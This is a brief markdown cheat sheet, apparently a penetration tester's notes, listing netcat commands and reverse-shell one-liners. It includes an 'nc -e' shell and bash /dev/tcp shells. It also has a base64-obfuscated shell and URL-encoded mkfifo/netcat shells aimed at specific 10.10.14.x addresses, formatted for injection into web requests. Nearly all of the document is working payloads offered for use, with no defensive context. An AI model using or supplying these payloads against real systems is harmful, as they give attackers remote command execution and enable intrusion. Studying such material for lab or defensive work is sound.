# Netcat
Comm | Desc
--- | ---
`nc -l -p <port>` | listen on port
`nc <dest_ip> <port>` | Connect to dest_ip on port
`nc <dest_ip> <port> -e <binary>` | Connect to dest_ip on port executing binary (great for rev shell)


#netcatalternative
- `setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &`
- `bash -i &>/dev/tcp/IP/PORT 0>&1' #`
- `echo $(echo 'bash -i &> /dev/tcp/IP/PORT  <&1' | base64) | base64 -d | bash`


`echo%20"YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xMjEvNjY2NiA8JjE="%20|%20base64%20-d%20|%20bash`


## NC with pipe over file
`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.176%204443%20%3E%2Ftmp%2Ff`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 6666 >/tmp/f 

